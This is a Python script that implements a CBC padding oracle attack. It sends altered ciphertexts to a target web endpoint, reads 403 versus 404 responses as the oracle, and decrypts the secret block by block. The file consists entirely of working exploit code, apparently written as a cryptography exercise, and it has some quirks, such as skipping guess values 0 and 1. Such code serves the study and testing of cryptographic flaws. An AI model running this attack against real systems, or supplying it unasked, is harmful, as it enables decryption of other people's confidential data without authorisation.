#!/usr/bin/env python
#
# Copyright AlertAvert.com (c) 2013. All rights reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

__author__ = 'marco'

import argparse
import requests


class PaddingOracle(object):

    BAD_PAD_CODE = 403
    BAD_CIPHER_CODE = 404

    def __init__(self, url, prefix, query_arg):
        self.url = '/'.join([url, prefix])
        self.query_arg = query_arg

    def is_padding(self, query):
        payload = {self.query_arg: query.encode('hex')}
        response = requests.get(self.url, params=payload)
        if response.status_code == PaddingOracle.BAD_PAD_CODE:
            return False
        elif response.status_code == PaddingOracle.BAD_CIPHER_CODE:
            return True
        else:
            print("This was the response: {response}".format(response=response.text))
            return True


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', required=True)
    parser.add_argument('--arg', default="er")
    parser.add_argument('--prefix', default="po")
    parser.add_argument('cipher', help="The HEX encoded ciphertext to try")
    return parser.parse_args()


def split_cipher(cipher, block_len=16):
    """ Splits the ciphertext in blocks of ```block_len``` bytes

    :param cipher:
    :return: the blocks that make up the ciphertext
    :rtype: list
    """
    iv = cipher[:block_len]
    blocks = cipher[block_len:]
    secret = [iv]
    while blocks:
        secret.append(blocks[:block_len])
        blocks = blocks[block_len:]
    return secret


def replace(s, i, c):
    """ Replaces the i-th char of ```s``` with ```c```

    :param s: a string whose i-th char we want to replace
    :param i: the index of the char to replace
    :param c: the new value to insert
    :return: a new string, whose i-th char is ```c```
    """
    return ''.join([s[:i], c, s[i+1:]])


def last_word_oracle(oracle, c0, c1, j=0, pj='', block_len=16):
    b = block_len
    next_guess = j + 1
    nc0 = c0
    # we already know the correct values for the last j bytes
    # we'll try with the appropriated pad value (J + 1)
    for n in range(0, j):
        rep = ord(c0[b - n - 1]) ^ ord(pj[-n - 1]) ^ next_guess
        nc0 = replace(nc0, b - n - 1, chr(rep))
    rb = c0[b - next_guess]
    for g in xrange(2, 256):
        pad_try = ord(rb) ^ g ^ next_guess
        nc0 = replace(nc0, b - next_guess, chr(pad_try))
        if oracle.is_padding(''.join([nc0, c1])):
            return ''.join([chr(g), pj])
    else:
        raise ValueError("Could not guess a valid pad, no matter how hard I tried")


def find_padding(oracle, cipher, block_len=16):
    c = split_cipher(cipher, block_len=block_len)
    padding_len = ord(last_word_oracle(oracle, c[2], c[3]))
    return padding_len


def decrypt_block(oracle, block, prev_block, block_len=16):
    plaintext = ''
    for j in range(0, block_len):
        plaintext = last_word_oracle(oracle, prev_block, block, j=j, pj=plaintext)
    return plaintext


def main():
    config = parse_args()
    oracle = PaddingOracle(config.url, config.prefix, config.arg)
    cipher = config.cipher.decode('hex')
    padding = find_padding(oracle, cipher)
    c = split_cipher(cipher, block_len=16)
    plaintext_blocks = []
    for j in range(len(c) - 1):
        plaintext_blocks.append(decrypt_block(oracle, c[j + 1], c[j]))
    plaintext_blocks[-1] = plaintext_blocks[-1][:padding]
    print("Decrypted secret: {}".format(''.join(plaintext_blocks)))

if __name__ == "__main__":
    main()
